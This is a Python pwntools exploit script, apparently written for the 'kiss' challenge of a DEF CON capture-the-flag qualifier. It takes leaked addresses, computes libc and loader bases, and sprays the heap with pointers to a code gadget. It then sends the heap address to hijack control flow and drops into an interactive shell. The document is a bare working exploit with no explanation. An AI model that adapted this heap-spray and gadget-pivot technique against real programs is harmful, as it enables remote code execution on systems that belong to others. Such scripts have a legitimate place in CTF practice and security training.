from pwn import *

debug = True;
p = process("./kiss")
#p = remote("kiss_88581d4e20dc97355f1d86b6905f6103.quals.shallweplayaga.me", 3155);

def recv_until(s):
  result = p.recvuntil(s)
  if debug:
    log.info(result)
  
def get_base():
  recv_until("is around ")

  approx_addr = p.recvuntil("\n")
  approx_addr = approx_addr[:-1]

  if debug:
    log.info(approx_addr)

  return int(approx_addr, 16)

buf_base = get_base()
bin_base = get_base()

libc_base = bin_base + 0x5ea000
ld_base = bin_base + 0x225000

# Not exact start
heap_start = buf_base + 0x900 
gadget_addr = ld_base + 0x1698b
#magic_gadget = libc_base + 0x46533

heap_payload = p64(heap_start + 8) + p64(heap_start + 16) + p64(heap_start + 24) + p64(gadget_addr)

recv_until("do you want? ")
p.sendline("A00")
if debug:
  log.info("A00 sended")

recv_until("Waiting for data.\n")
p.send(heap_payload * (0xa00 / 32))
if debug:
  log.info("Heap payload sended")

recv_until("attempt? ")
p.sendline(hex(heap_start)[2:])
if debug:
  log.info(hex(heap_start)[2:] + " sended")

p.interactive()

p.close ()
